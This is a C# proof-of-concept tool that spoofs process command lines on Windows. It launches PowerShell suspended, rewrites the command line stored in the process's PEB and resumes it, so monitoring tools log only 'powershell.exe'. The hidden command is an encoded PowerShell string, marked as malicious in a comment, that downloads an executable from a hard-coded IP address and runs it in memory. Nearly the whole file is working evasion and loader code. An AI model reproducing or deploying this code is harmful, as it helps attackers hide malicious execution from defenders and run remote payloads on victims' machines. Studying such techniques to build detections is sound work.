﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

using static CmdLineSpoofer.Native;

namespace CmdLineSpoofer
{
    class Program
    {
        static void Main(string[] args)
        {
            // the malicious command
            string maliciousCommand = "powershell.exe -exec bypass -enc WwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgAyADgALwBwAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAKAAsACAAWwBzAHQAcgBpAG4AZwBbAF0AXQAgACgAJwAxADkAMgAuADEANgA4AC4AMQAuADIAMgA4ACcALAAgAFsAcwB0AHIAaQBuAGcAXQAgACQAUABJAEQALAAgACcAMQAwACcAKQApACkAOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADAAMAB9AA==\0";

            // the command to spoof
            string spoofedCommand = "powershell.exe".PadRight(maliciousCommand.Length, ' ');

            Debug("[+] Spoofing command: " + spoofedCommand.Trim(' '));

            // spawn a process to spoof the command line of
            STARTUPINFO si = new STARTUPINFO();
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            bool success = CreateProcess(null, spoofedCommand, ref sa, ref sa, false, CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, "C:\\windows\\", ref si, out PROCESS_INFORMATION pi);

            if(!success)
            {
                Debug("[!] Unable to spawn process!");
                return;
            }

            Debug("[+] Process spawned, PID: {0}", new string[] { pi.dwProcessId.ToString() });

            // grab the PEB address of the newly spawned process
            PROCESSINFOCLASS pic = new PROCESSINFOCLASS();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            int status = NtQueryInformationProcess(pi.hProcess, pic, out pbi, Marshal.SizeOf(pbi), out int retLength);

            if (status != 0)
            {
                Debug("[!] Unable to read PEB address!");
                return;
            }

            Debug("[+] PEB Address: 0x{0}", new string[] { pbi.PebBaseAddress.ToString("X") });

            // read the PEB structure, so we can get  the ProcessParameters address
            PEB peb;
            byte[] pebBuffer = new byte[Marshal.SizeOf(new PEB())];
            ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out IntPtr bytesRead);

            unsafe
            {
                fixed (byte* ptr = pebBuffer)
                {
                    peb = (PEB)Marshal.PtrToStructure((IntPtr)ptr, typeof(PEB));
                }
            }

            Debug("[+] ProcessParameters Address: 0x{0}", new string[] { peb.ProcessParameters.ToString("X") });

            // read the ProcessParameters structure, so we can get the CmdLine address
            RTL_USER_PROCESS_PARAMETERS procParams;
            byte[] uppBuffer = new byte[Marshal.SizeOf(new RTL_USER_PROCESS_PARAMETERS())];
            ReadProcessMemory(pi.hProcess, peb.ProcessParameters, uppBuffer, uppBuffer.Length, out bytesRead);

            unsafe
            {
                fixed (byte* ptr = uppBuffer)
                {
                    procParams = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure((IntPtr)ptr, typeof(RTL_USER_PROCESS_PARAMETERS));
                }
            }

            Debug("[+] CommandLine Address: 0x{0}", new string[] { procParams.CommandLine.ToString("X") });

            // read the CommandLine address
            string cmdLine;
            byte[] cmdLineBytes = new byte[procParams.Length];
            ReadProcessMemory(pi.hProcess, procParams.CommandLine, cmdLineBytes, cmdLineBytes.Length, out bytesRead);

            unsafe
            {
                fixed (byte* ptr = cmdLineBytes)
                {
                    cmdLine = Encoding.Unicode.GetString(cmdLineBytes);
                }
            }

            Debug("[+] Original CommandLine: {0}", new string[] { cmdLine });

            // we need to write byte array to procParams.CommandLine
            byte[] newCmdLine = Encoding.Unicode.GetBytes(maliciousCommand);
            WriteProcessMemory(pi.hProcess, procParams.CommandLine, newCmdLine, newCmdLine.Length, out IntPtr lpNumberOfBytesWritten);

            // we also need to write the spoofed command length as ushort to peb.ProcessParameters  + 112 bytes
            byte[] sizeOfCmdLine = BitConverter.GetBytes((ushort)("powershell.exe".Length * 2));
            WriteProcessMemory(pi.hProcess, IntPtr.Add(peb.ProcessParameters, 112), sizeOfCmdLine, sizeOfCmdLine.Length, out lpNumberOfBytesWritten);

            Debug("[+] New CommandLine: {0}, written to process", new string[] { maliciousCommand });

            // resume the process
            ResumeThread(pi.hThread);

            Debug("[+] Resuming process");

            Debug("Press a key to end PoC...");
            Console.ReadLine();
        }

        public static void Debug(string text, string[] args)
        {
#if DEBUG
            Console.WriteLine(text, args);
#endif
        }

        public static void Debug(string text)
        {
#if DEBUG
            Console.WriteLine(text, new string[] { });
#endif
        }
    }
}
